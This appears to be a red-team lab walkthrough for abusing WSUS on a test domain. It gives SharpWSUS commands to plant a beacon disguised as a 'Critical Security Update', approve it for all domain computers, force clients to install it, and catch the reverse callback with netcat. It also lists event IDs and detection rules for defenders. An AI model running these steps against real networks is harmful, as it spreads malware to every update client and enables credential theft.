# WT#030 — WSUS Abuse

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | mbr02 (192.168.77.23) |
| **Domain** | range.local |
| **Starting Credential** | Code execution on mbr02 (low-priv or SYSTEM) |
| **Tools Required** | SharpWSUS |
| **Certifications** | WKL (WasteHelloKitty — OADOC) |
| **MITRE ATT&CK** | T1210 (Exploitation of Remote Services), T1574 (Hijack Execution Flow) |
| **Difficulty** | Medium |

## Prerequisites
- Code execution on mbr02
- mbr02 configured as WSUS client (pointing to a WSUS server in range.local)
- WSUS server uses HTTP (not HTTPS) — default CADRE WSUS config
- SharpWSUS.exe on attacker VM

## Attack Steps

### 1. Discover WSUS server

```powershell
# On mbr02 — check WSUS configuration
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" | Select-Object WUServer, WUStatusServer

# Or via SharpWSUS
SharpWSUS.exe inspect
```

### 2. Identify WSUS approval groups

```powershell
SharpWSUS.exe inspect /computer:mbr02.range.local
```

### 3. Inject malicious update

```powershell
# Stage a malicious MSI that executes a beacon
SharpWSUS.exe create /payload:"C:\Temp\beacon.exe" /args:"--connect 192.168.77.5 443" /name:"Critical Security Update KB5000000" /title:"May 2026 Security Monthly Quality Rollup"
```

### 4. Approve update for target group

```powershell
SharpWSUS.exe approve /updateid:<UPDATE_ID> /group:"Domain Computers" /computer:mbr02.range.local
```

### 5. Trigger update check on victim

```powershell
# On victim machine
wuauclt /detectnow /updatenow
# Or remotely:
Invoke-WSUSUpdate -ComputerName victim.range.local -UpdateId <UPDATE_ID>
```

### 6. Capture callback

```powershell
# Attacker listener catches beacon from payload executed via WSUS
nc -lvnp 443
```

## Post-Exploitation Chain
```
Code Exec on mbr02
  └──> WSUS Abuse (WT#030)
       └──> Malicious update approved
            └──> Code exec on ALL WSUS clients
                 ├──> Lateral movement across range.local
                 └──> Credential harvesting from endpoints
```

## Telemetry Verification
**On WSUS server:**
- **Event ID 4663** (WSUS admin approval via API)
- **Event ID 7040** (Windows Update service start/stop)
- IIS logs: `C:\Program Files\Update Services\LogFiles\W3SVC1\*.log`

**On mbr02 (WSUS client):**
- **Event ID 41** (Windows Update agent — installed update)
- **Event ID 43** (Windows Update agent — installation failure)
- **Event ID 19** (Windows Update — restart required)
- **Event ID 63** (Windows Update agent — installation completed)
- File creation: `C:\Windows\SoftwareDistribution\Download\*.msi`

**Detection Rules:**
- Monitor for unsigned MSI payloads pushed via WSUS
- Correlation of `Event ID 19/43/63` with unexpected process creation
- WSUS admin actions (Event ID 4663) from non-admin accounts

## Status
**CONFIGURED** — WSUS server operational in range.local, SharpWSUS attack path is functional.
